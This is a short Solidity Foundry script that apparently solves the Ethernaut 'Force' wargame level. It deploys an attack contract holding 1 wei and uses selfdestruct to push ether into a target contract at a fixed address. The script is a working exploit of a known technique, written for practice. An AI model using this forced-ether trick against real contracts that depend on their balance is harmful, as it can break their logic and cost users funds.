// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Force } from "../src/Force.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attack {

    constructor() payable {}

    function AForce(address payable target) public {
        selfdestruct(target);
    }

}

contract ForceSolution is Script {
    Force force = Force(0xdF022464367b15449290dC120bE3B4bFa175e29d);
    Attack attack;

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        attack = new Attack{value: 1}();

        attack.AForce(payable(address(force)));
        vm.stopBroadcast();

    }
}